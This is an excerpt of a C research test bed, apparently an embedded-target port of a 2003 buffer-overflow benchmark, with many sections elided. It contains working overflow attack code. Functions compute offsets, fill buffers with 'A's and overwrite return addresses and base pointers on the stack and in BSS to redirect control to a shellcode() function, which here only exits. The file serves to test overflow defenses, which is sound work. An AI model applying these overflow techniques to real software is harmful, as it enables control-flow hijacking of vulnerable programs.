 ...
 *
 * Published at Network & Distributed System Security Symposium 2003: "A
 * Comparison of Publicly Available Tools for Dynamic Buffer Overflow
 * Prevention"
 *
 * Copyright 2003 John Wilander Dept. of Computer Science, Linkoping
 * University, Sweden johwi@ida.liu.se http://www.ida.liu.se/~johwi
 *
 ...
 * development, implementation, or the like, in any public, published, or
 * commercial work you should refer to to our original NDSS'03 paper (see
 * above) and give acknowledgement to the author of the source code. This
 * source code header must not be removed. Apart from that you can use it
 * freely! The author takes no responsibility for how you use it. Good luck!
 */
 ...
 * stands for System-Level Design Group (https://sld.cs.columbia.edu/).
 */
...
void shellcode(void) {
  ...
  /* WORKAROUND TO FORCE CONSOLE FLUSH IN MODELSIM */
  unsigned i = 0, j = 4;
  for (i = 0; i < 1000; i++) { j += j; }

  exit(0);
}

/* SLD: we did not use command-line arguments since they are not
 * supported in all architectures we target (e.g., PULPino). */
...
void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
  ...
  /* SLD: Missing printf for these cases. */
...
void stack_return_addr(int choice, unsigned dummy) { /* Attack forms 1(a) and 3(a) */
  ...
  if ((choice == 1) &&
      ((long)dummy > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a new return address */
    overflow = (int)((long)(dummy-28) - (long)&stack_buffer);
    ...
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(dummy-32);
...
void vuln_stack_return_addr(int choice) {
...
/* SLD: Adding a dummy variable to use it as offset to
 * implement the attack. Alternatively we could use x8. */
void bss_return_addr(int choice, unsigned dummy) { /* Attack form 4(a)*/
...
void vuln_bss_return_addr(int choice) {
   ...
   unsigned dummy_variable = 0;
   bss_return_addr(choice, (unsigned) &dummy_variable);
}
...
void vuln_bss_base_ptr(int choice) { /* Attack form 4(b)*/
  ...
  if ((choice == 12) &&
    ...
    memset(overflow_buffer+3, 'A', overflow-4*(3+1));
    /* Old base pointer */
    overflow_buffer[overflow/4-1] = (long)(&choice-(base_pointer_offset/4));
...
int argc = 2; /* SLD: Decomment only one of the following lines. */
const char *argv[] = { "./attack", "-2" }; /* Choice: -4. */
/* const char *argv[] = { "./attack", "-3" }; */ /* Choice: -3. */
/* const char *argv[] = { "./attack", "-2" }; */ /* Choice: -2. */
/* const char *argv[] = { "./attack", "-1" }; */ /* Choice: -1. */
/* const char *argv[] = { "./attack", "1"  }; */ /* choice: +1. */
/* const char *argv[] = { "./attack", "2"  }; */ /* choice: +2. */
/* const char *argv[] = { "./attack", "3"  }; */ /* choice: +3. */
/* const char *argv[] = { "./attack", "4"  }; */ /* choice: +4. */
/* const char *argv[] = { "./attack", "5"  }; */ /* choice: +5. */
/* const char *argv[] = { "./attack", "6"  }; */ /* choice: +6. */
/* const char *argv[] = { "./attack", "7"  }; */ /* choice: +7. */
/* const char *argv[] = { "./attack", "8"  }; */ /* choice: +8. */
/* const char *argv[] = { "./attack", "9"  }; */ /* choice: +9. */
/* const char *argv[] = { "./attack", "10" }; */ /* choice: +10. */
/* const char *argv[] = { "./attack", "11" }; */ /* choice: +11. */
...
int main (void) {
  ...
  /*   fprintf(stderr, "Optional base pointer offset = number of bytes inbetween "
   *    "return address and base pointer on stack (used with canary values).\n\n"); */
  /*   return -1; } */
